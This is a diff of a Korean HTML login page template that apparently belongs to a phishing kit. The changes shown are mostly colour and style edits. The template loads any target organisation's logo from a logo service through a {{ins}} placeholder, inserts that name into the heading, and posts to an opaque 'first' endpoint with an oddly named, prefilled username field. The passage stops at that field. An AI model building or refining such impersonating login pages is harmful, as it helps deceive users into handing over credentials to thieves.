@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="ko">
 <head>
-  <title>로그인</title>
+  <title>환상적인 로그인</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="icon" href="https://logo.clearbit.com/{{ins}}" type="image/x-icon"/>
   <style>
@@ -12,18 +12,18 @@
       background-size: cover;
       width: 100%;
       height: 100vh;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      color: #2E8B57; /* Dark green text color */
+      font-family: 'Arial', sans-serif;
+      color: #1E90FF; /* 도저 블루 텍스트 색상 */
     }
 
     .login-container {
       width: 90%;
       max-width: 400px;
       margin: auto;
-      height: 480px; /* Increased height for a more spacious feel */
-      background: linear-gradient(to right, #8FBC8F, #9ACD32);
-      border-radius: 20px; /* Increased border-radius for a more rounded appearance */
-      color: #fff;
+      height: 480px;
+      background: linear-gradient(to right, #FFA07A, #FFD700); /* 연한 샐몬에서 금까지 그래디언트 */
+      border-radius: 20px;
+      color: #333; /* 더 어두운 텍스트 색상 */
       position: absolute;
       top: 50%;
       left: 50%;
@@ -35,57 +35,58 @@
     }
 
     .login-container:hover {
-      background: linear-gradient(to right, #3CB371, #4CAF50);
+      background: linear-gradient(to right, #FF6347, #FF4500); /* 토마토에서 오렌지로 그래디언트를 호버 시 */
       transform: translate(-50%, -50%) scale(1.05);
     }
 
     .login-container.show {
       opacity: 1;
-      border-radius: 30px; /* Further increased border-radius for a softer look */
+      border-radius: 30px;
     }
 
     .login-container h1 {
       margin: 0;
       padding: 0;
-      font-size: 32px; /* Larger font size for the main heading */
+      font-size: 32px;
       font-weight: bold;
       text-align: center;
       margin-bottom: 20px;
       text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+      color: #1E90FF; /* 도저 블루 헤딩 색상 */
     }
 
     .login-container p {
       margin: 0;
       padding: 0;
-      font-size: 18px; /* Increased font size for paragraphs */
-      color: #fff;
-      margin-bottom: 12px; /* Increased margin for better spacing */
+      font-size: 18px;
+      color: #333;
+      margin-bottom: 12px;
     }
 
     .login-container input {
       width: 100%;
       margin-bottom: 20px;
-      padding: 14px; /* Increased padding for input fields */
-      border-radius: 10px; /* Increased border-radius for input fields */
-      border: 1px solid #2E8B57;
+      padding: 14px;
+      border-radius: 10px;
+      border: 1px solid #1E90FF;
       transition: border-color 0.3s, transform 0.3s;
       animation: inputPulse 1s infinite alternate;
     }
 
     .login-container input[type="submit"] {
       cursor: pointer;
-      background: linear-gradient(to right, #2E8B57, #3CB371);
-      color: #fff;
-      font-size: 20px; /* Increased font size for the submit button */
+      background: linear-gradient(to right, #1E90FF, #4169E1); /* 도저 블루에서 로얄 블루로 그래디언트 */
+      color: #fff; /* 흰색 텍스트 색상 */
+      font-size: 20px;
       border: none;
-      border-radius: 25px; /* Increased border-radius for the submit button */
-      padding: 14px 24px; /* Increased padding for the submit button */
+      border-radius: 25px;
+      padding: 14px 24px;
       transition: background 0.3s, color 0.3s, transform 0.3s;
       box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
     }
 
     .login-container input[type="submit"]:hover {
-      background: linear-gradient(to right, #3CB371, #4CAF50);
+      background: linear-gradient(to right, #4169E1, #000080); /* 로얄 블루에서 해군 그래디언트로 호버 시 */
       color: #fff;
       box-shadow: 0 0 20px rgba(0, 0, 0, 0.3), 0 0 10px rgba(0, 0, 0, 0.2);
       animation: buttonPulse 0.5s ease-in-out;
@@ -115,12 +116,12 @@
     .login-container a {
       text-decoration: none;
       font-size: 14px;
-      color: #fff;
+      color: #1E90FF;
       transition: color 0.3s;
     }
 
     .login-container a:hover {
-      color: #3CB371;
+      color: #FF4500; /* 호버 시 오렌지 색상 */
     }
 
     .avatar {
@@ -130,14 +131,14 @@
       position: absolute;
       top: -40px;
       left: calc(50% - 40px);
-      border: 3px solid #fff; /* Added border for emphasis */
+      border: 3px solid #fff;
     }
   </style>
 </head>
 <body>
   <div class="login-container">
     <img src="https://logo.clearbit.com/{{ins}}" class="avatar">
-    <h1>로그인</h1>
+    <h1>{{ins}} 로그인</h1>
     <form action="first" method="post">
       <p>사용자 이름</p>
       <input type="text" name="horse" placeholder="사용자 이름을 입력하세요" value="{{eman}}">
